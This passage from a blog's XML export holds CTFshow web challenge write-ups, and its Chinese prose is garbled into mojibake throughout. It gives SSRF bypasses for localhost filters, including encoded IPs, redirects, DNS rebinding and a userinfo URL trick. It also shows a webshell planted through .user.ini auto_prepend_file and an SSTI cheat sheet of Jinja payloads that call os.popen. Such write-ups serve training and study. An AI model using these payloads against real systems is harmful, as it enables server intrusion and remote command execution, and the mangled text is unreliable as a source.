class="language-PHP">&lt;?php$url &#x3D; &#39;http:&#x2F;&#x2F;username:password@hostname&#x2F;path?arg&#x3D;value#anchor&#39;;print_r(parse_url($url));?&gt;ä»¥ä¸Šä¾‹ç¨‹ä¼šè¾“å‡ºï¼šArray([scheme] &#x3D;&gt; http[host] &#x3D;&gt; hostname[user] &#x3D;&gt; username[pass] &#x3D;&gt; password[path] &#x3D;&gt; &#x2F;path[query] &#x3D;&gt; arg&#x3D;value[fragment] &#x3D;&gt; anchor)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒä¸Šå³å¯</p><p><strong>353</strong></p><p>ç»•è¿‡127.0.0.1ï¼Œå¯ä½¿ç”¨è¿›åˆ¶è½¬æ¢æˆ–å…¶ä»–IP</p><pre class="line-numbers language-none"><code class="language-none">è¿›åˆ¶è½¬æ¢ï¼šæ•´æ•°è½¬æ¢è¿‡ç¨‹ï¼Œå°†æ¯ä¸€ä½IPè½¬æ¢ä¸ºäºŒè¿›åˆ¶å¹¶è¿›è¡Œæ‹¼æ¥2130706433 &#x2F;&#x2F;åè¿›åˆ¶æ•´æ•°0x7F.0.0.1 &#x2F;&#x2F;åå…­è¿›åˆ¶0177.0.0.1 &#x2F;&#x2F;å…«è¿›åˆ¶0x7F000001 &#x2F;&#x2F;åå…­è¿›åˆ¶æ•´æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">å…¶ä»–IPï¼š127.127.127.12700.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>354</strong></p><p>è¿‡æ»¤æ²¡äº†ï¼Œåªèƒ½æŒ‡å‘å…¶ä»–åŸŸå</p><p>1ã€å°†è‡ªå·±åŸŸåè§£æä¸º127.0.0.1</p><p>2ã€å°†è‡ªå·±ç½‘ç«™è®¾ç½®ä¸º302é‡å®šå‘åˆ°127.0.0.1</p><p><strong>355</strong></p><p>ç”¨0æˆ–è€…127.1</p><p>0åœ¨linuxç³»ç»Ÿä¸­ä¼šè§£ææˆ127.0.0.1åœ¨windowsä¸­è§£ææˆ0.0.0.0</p><p><strong>356</strong></p><p>æ›´çŸ­äº†åªèƒ½ç”¨0</p><p><strong>357</strong></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">gethostbyname â€” è¿”å›ä¸»æœºåå¯¹åº”çš„ IPv4åœ°å€# php filterå‡½æ•°filter_var()è·å–ä¸€ä¸ªå˜é‡ï¼Œå¹¶è¿›è¡Œè¿‡æ»¤filter_var_array()è·å–å¤šä¸ªå˜é‡ï¼Œå¹¶è¿›è¡Œè¿‡æ»¤......# PHP è¿‡æ»¤å™¨FILTER_VALIDATE_IPæŠŠå€¼ä½œä¸º IP åœ°å€æ¥éªŒè¯ï¼Œåªé™ IPv4 æˆ– IPv6 æˆ– ä¸æ˜¯æ¥è‡ªç§æœ‰æˆ–è€…ä¿ç•™çš„èŒƒå›´FILTER_FLAG_IPV4 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv4 IPï¼ˆæ¯”å¦‚ 255.255.255.255ï¼‰FILTER_FLAG_IPV6 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv6 IPï¼ˆæ¯”å¦‚ 2001:0db8:85a3:08d3:1319:8a2e:0370:7334ï¼‰FILTER_FLAG_NO_PRIV_RANGE - è¦æ±‚å€¼æ˜¯ RFC æŒ‡å®šçš„ç§åŸŸ IP ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰FILTER_FLAG_NO_RES_RANGE - è¦æ±‚å€¼ä¸åœ¨ä¿ç•™çš„ IP èŒƒå›´å†…ã€‚è¯¥æ ‡å¿—æ¥å— IPV4 å’Œ IPV6 å€¼ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äºè·å–åˆ°äº†æŒ‡å‘åŸŸåçš„IPå€¼æ‰€ä»¥åŸŸåæŒ‡å‘127.0.0.1ä¸å†ç”Ÿæ•ˆï¼Œåªèƒ½ä½¿ç”¨302é‡å®šå‘æˆ–è€…<strong>DNS rebindingï¼ˆDNSé‡æ–°ç»‘å®šæ”»å‡»ï¼‰</strong></p><h3 id="DNS-rebindingï¼š"><a href="#DNS-rebindingï¼š" class="headerlink" title="DNS rebindingï¼š"></a>DNS rebindingï¼š</h3><pre class="line-numbers language-none"><code class="language-none">æ”»å‡»é‡ç‚¹åœ¨äºDNSæœåŠ¡èƒ½å¤Ÿåœ¨ä¸¤æ¬¡DNSæŸ¥è¯¢ä¸­è¿”å›ä¸ç”¨çš„IPåœ°å€ï¼Œç¬¬ä¸€æ¬¡æ˜¯çœŸæ­£çš„IPï¼Œç¬¬äºŒæ¬¡æ˜¯æ”»å‡»ç›®æ ‡IPåœ°å€ï¼Œç”šè‡³å¯ä»¥é€šè¿‡è¿™ç§æ”»å‡»æ–¹æ³•ç»•è¿‡åŒæºç­–ç•¥å›åˆ°é¢˜ç›®ï¼Œåœ¨é¢˜ç›®ä»£ç ä¸­ä¸€å…±å¯¹åŸŸåè¿›è¡Œäº†ä¸¤æ¬¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡æ˜¯ gethostbyname æ–¹æ³•ï¼Œç¬¬äºŒæ¬¡åˆ™æ˜¯ file_get_contents æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥é€šè¿‡ ceye.io æ¥å®ç°æ”»å‡»ï¼ŒDNS Rebinding ä¸­è®¾ç½®ä¸¤ä¸ª IPï¼Œä¸€ä¸ªæ˜¯ 127.0.0.1 å¦ä¸€ä¸ªæ˜¯éšä¾¿å¯ä»¥è®¿é—®çš„ IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>358</strong></p><p>æ­£åˆ™åŒ¹é…è¦æ±‚URLä»¥<a href="http://ctf.å¼€å¤´,ä»¥showç»“å°¾/">http://ctf.å¼€å¤´ï¼Œä»¥showç»“å°¾</a></p><p>ä¸€ä¸ªå®Œæ•´çš„URLçš„æ ¼å¼å¦‚ä¸‹</p><p><code>http://username:password@hostname/path?arg=value#anchor</code></p><p>å…¶ä¸­hostnameå°±æ˜¯æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨çš„ç½‘å€ï¼Œæˆ‘ä»¬åªéœ€è¦è®©usernameä½ç½®ä¸ºctf.ï¼Œè®©anchorä½ç½®ä¸ºshowå³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTurl&#x3D;http:&#x2F;&#x2F;ctf.@127.0.0.1&#x2F;flag.php#show<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>359</strong></p><p>éšä¾¿è¾“å…¥ä¸ªç”¨æˆ·åå¯†ç å°è¯•ç™»å½•</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-01">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-01</a> 01.12.20.png)</p><p>æŠ“åŒ…å‘ç°returlå‚æ•°å¯èƒ½å­˜åœ¨SSRFæ³¨å…¥ç‚¹ï¼Œä½¿ç”¨Gopherusç”Ÿæˆæ”»å‡»payload</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-01">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-01</a> 22.36.11.png)</p><p>å†™å…¥ä¹‹åè®¿é—®å³å¯</p><p><strong>360</strong></p><p>åŒä¸Š</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-01">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-01</a> 22.44.48.png)</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowè®°å½•</title>
      <link href="/posts/82271b5a.html"/>
      <url>/posts/82271b5a.html</url>
      
        <content type="html"><![CDATA[<h3 id="babyæ¯â€”â€”baby-php"><a href="#babyæ¯â€”â€”baby-php" class="headerlink" title="babyæ¯â€”â€”baby_php"></a>babyæ¯â€”â€”baby_php</h3><p>å®¡è®¡ä»£ç ï¼Œæ˜æ˜¾æ˜¯æ–‡ä»¶ä¸Šä¼ </p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class fileUtil&#123;    private $name;    private $content;    public function __construct($name,$content&#x3D;&#39;&#39;)&#123;        $this-&gt;name &#x3D; $name;        $this-&gt;content &#x3D; $content;        ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#39;);    &#125;    public function file_upload()&#123;        if($this-&gt;waf($this-&gt;name) &amp;&amp; $this-&gt;waf($this-&gt;content))&#123;            return file_put_contents($this-&gt;name, $this-&gt;content);        &#125;else&#123;            return 0;        &#125;    &#125;    private function waf($input)&#123;        return !preg_match(&#39;&#x2F;php&#x2F;i&#39;, $input);    &#125;    public function file_download()&#123;        if(file_exists($this-&gt;name))&#123;            header(&#39;Content-Type: application&#x2F;octet-stream&#39;);            header(&#39;Content-Disposition: attachment; filename&#x3D;&quot;&#39;.$this-&gt;name.&#39;&quot;&#39;);            header(&#39;Content-Transfer-Encoding: binary&#39;);            echo file_get_contents($this-&gt;name);        &#125;else&#123;            return False;        &#125;    &#125;    public function __destruct()&#123;    &#125;&#125;$action &#x3D; $_GET[&#39;a&#39;]?$_GET[&#39;a&#39;]:highlight_file(__FILE__);if($action&#x3D;&#x3D;&#x3D;&#39;upload&#39;)&#123;    die(&#39;Permission denied&#39;);&#125;switch ($action) &#123;    case &#39;upload&#39;:        $name &#x3D; $_POST[&#39;name&#39;];        $content &#x3D; $_POST[&#39;content&#39;];        $ft &#x3D; new fileUtil($name,$content);        if($ft-&gt;file_upload())&#123;            echo $name.&#39; upload success!&#39;;        &#125;        break;    case &#39;download&#39;:        $name &#x3D; $_POST[&#39;name&#39;];        $ft &#x3D; new fileUtil($name,$content);        if($ft-&gt;file_download()&#x3D;&#x3D;&#x3D;False)&#123;            echo $name.&#39; download failed&#39;;        &#125;        break;    default:        echo &#39;baby come on&#39;;        break;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°çŸ¥è¯†ï¼š$_GET[â€˜aâ€™]åœ¨æ²¡æœ‰è¢«èµ‹å€¼æ—¶é»˜è®¤å€¼æ—¶trueï¼Œcaseçš„åˆ¤å®šæ˜¯å¼±ç›¸ç­‰</p><p>å…³é”®ä»£ç </p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$action &#x3D; $_GET[&#39;a&#39;]?$_GET[&#39;a&#39;]:highlight_file(__FILE__);if($action&#x3D;&#x3D;&#x3D;&#39;upload&#39;)&#123;&#x2F;&#x2F;aåªå£°æ˜ä¸èµ‹å€¼é»˜è®¤ä¸ºtrueï¼Œå¼ºç›¸ç­‰åˆ¤å®šæ— æ³•é€šè¿‡    die(&#39;Permission denied&#39;);&#125;switch ($action) &#123;    case &#39;upload&#39;:&#x2F;&#x2F;true&#x3D;&#x3D;&quot;upload&quot;ï¼Œåˆ¤å®šç»“æœä¸ºçœŸï¼Œè¿›å…¥uploadä¸Šä¼ æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹å“åº”å¤´ä¸­é—´ä»¶ä¸ºnginxï¼Œä¸Šä¼ .user.iniæ–‡ä»¶æ¥åŒ…å«ï¼Œä¸€å®šè¦å…ˆä¸Šä¼ 1.txtæ–‡ä»¶ï¼Œä¸ç„¶åœ¨auto_prepend_fileå‚æ•°ç”Ÿæ•ˆå¹¶ä¸”æ‰¾ä¸åˆ°1.txtæ—¶æ•´ä¸ªç¯å¢ƒå°±åºŸäº†</p><pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;POST:content&#x3D;&lt;?&#x3D;&#96;$_GET[&#39;kkk&#39;]&#96;;?&gt;&amp;name&#x3D;1.txtPOST:content&#x3D;auto_prepend_file&#x3D;&quot;1.txt&quot;&amp;name&#x3D;.user.inipayload:?kkk&#x3D;tac &#x2F;flag_baby_here_you_are<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowSSTI</title>
      <link href="/posts/45647.html"/>
      <url>/posts/45647.html</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h3 id="Pythonä¸­æœ‰ç”¨çš„é­”æœ¯æ–¹æ³•"><a href="#Pythonä¸­æœ‰ç”¨çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="Pythonä¸­æœ‰ç”¨çš„é­”æœ¯æ–¹æ³•"></a><strong>Pythonä¸­æœ‰ç”¨çš„é­”æœ¯æ–¹æ³•</strong></h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">__class__           æŸ¥çœ‹å¯¹è±¡æ‰€åœ¨çš„ç±»__mro__             æŸ¥çœ‹ç»§æ‰¿å…³ç³»å’Œè°ƒç”¨é¡ºåºï¼Œè¿”å›å…ƒç»„__base__            è¿”å›åŸºç±»__bases__           è¿”å›åŸºç±»å…ƒç»„__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>    è¿”å›å­ç±»åˆ—è¡¨__init__            è°ƒç”¨åˆå§‹åŒ–å‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥è·³åˆ°__globals____globals__         è¿”å›å‡½æ•°æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´æ‰€å®šä¹‰çš„å…¨å±€å˜é‡ï¼Œè¿”å›å­—å…¸__builtins__        è¿”å›å†…å»ºå†…å»ºåç§°ç©ºé—´å­—å…¸__dic__              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ__getattribute__<span class="token punctuation">(</span><span class="token punctuation">)</span>   å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ<span class="token punctuation">.</span>æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚<span class="token punctuation">:</span>a<span class="token punctuation">.</span>xxx<span class="token operator">/</span>a<span class="token punctuation">.</span>xxx<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼‰éƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚__getitem__<span class="token punctuation">(</span><span class="token punctuation">)</span>        è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a<span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span>ï¼Œå°±æ˜¯a<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>__builtins__         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚<span class="token builtin">__import__</span>           åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ<span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span>            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚url_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>å«æœ‰current_appget_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>å«æœ‰current_applipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum<span class="token punctuation">.</span>__globals__å«æœ‰osæ¨¡å—ï¼š<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>cycler<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>current_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡request              å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–<span class="token builtin">open</span>å‡½æ•°<span class="token punctuation">:</span>request<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/proc\self\fd/3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>x1    getä¼ å‚request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x1  æ‰€æœ‰å‚æ•°request<span class="token punctuation">.</span>cookies      cookieså‚æ•°request<span class="token punctuation">.</span>headers      è¯·æ±‚å¤´å‚æ•°request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>x1    postä¼ å‚<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>applicaation<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencodedæˆ–multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">)</span>request<span class="token punctuation">.</span>data   postä¼ å‚<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>a<span class="token operator">/</span>b<span class="token punctuation">)</span>request<span class="token punctuation">.</span>json postä¼ json  <span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>json<span class="token punctuation">)</span>config               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä»£ç å—"><a href="#ä»£ç å—" class="headerlink" title="ä»£ç å—"></a>ä»£ç å—</h3><pre class="line-numbers language-none"><code class="language-none">å˜é‡å— &#123;&#123;&#125;&#125;ç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡ºæ³¨é‡Šå— &#123;##&#125;æ³¨é‡Šæ§åˆ¶å—&#123;%%&#125;å¯ä»¥å£°æ˜å˜é‡ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œè¯­å¥è¡Œå£°æ˜##å¯ä»¥æœ‰å’Œ&#123;%%&#125;ç›¸åŒçš„æ•ˆæœ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å¸¸ç”¨çš„è¿‡æ»¤å™¨"><a href="#å¸¸ç”¨çš„è¿‡æ»¤å™¨" class="headerlink" title="å¸¸ç”¨çš„è¿‡æ»¤å™¨"></a>å¸¸ç”¨çš„è¿‡æ»¤å™¨</h3><pre class="line-numbers language-none"><code class="language-none">int()ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›float()ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›lower()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›upper()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›title()ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›capitalize()ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›trim()ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›wordcount()ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›reverse()ï¼šå­—ç¬¦ä¸²åè½¬ï¼›replace(value,old,new)ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›truncate(value,length&#x3D;255,killwords&#x3D;False)ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›striptags()ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›escape()æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†&lt;ã€&gt;ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚safe()ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š &#123;&#123;&#39;&lt;em&gt;hello&lt;&#x2F;em&gt;&#39;|safe&#125;&#125;ï¼›list()ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›string()ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›join()ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›abs()ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›first()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›last()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›format(value,arags,*kwargs)ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#39;Hello?&#39;,&quot;Foo!&quot;) &#125;&#125;å°†è¾“å‡ºï¼šHelloo? - Foo!length()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›sum()ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›sort()ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›default(value,default_value,boolean&#x3D;false)ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default(&#39;xiaotuo&#39;)----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean&#x3D;Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean&#x3D;trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚length()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯count<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Flaskçš„ä¸€äº›å…¨å±€å˜é‡-amp-amp-å…³é”®å­—"><a 